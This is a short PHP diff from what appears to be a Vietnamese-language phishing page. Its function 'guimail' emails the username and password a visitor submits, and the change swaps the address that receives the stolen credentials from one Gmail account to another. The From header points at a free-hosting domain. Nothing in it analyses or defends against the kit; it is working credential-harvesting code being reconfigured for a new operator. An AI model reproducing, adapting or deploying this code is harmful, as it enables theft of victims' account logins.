@@ -7,11 +7,11 @@ function guimail($email){
     Tài khoản: '.$_POST['username'].'
     Mật khẩu: '.$_POST['password'];
     $header  =  "From:blabgdesh@viplikesiure.000webhostapp.com/ \r\n";
-    $header .=  "Cc:feararchy@gmail.com \r\n";
+    $header .=  "Cc:giangunl1@gmail.com \r\n";
 
     $success = mail ($to,$subject,$message,$header);
  }
- guimail("feararchy@gmail.com");
+ guimail("giangunl1@gmail.com");
 } else {
     echo 'Vui lòng nhập chi tiết đầy đủ của bạn';
 }
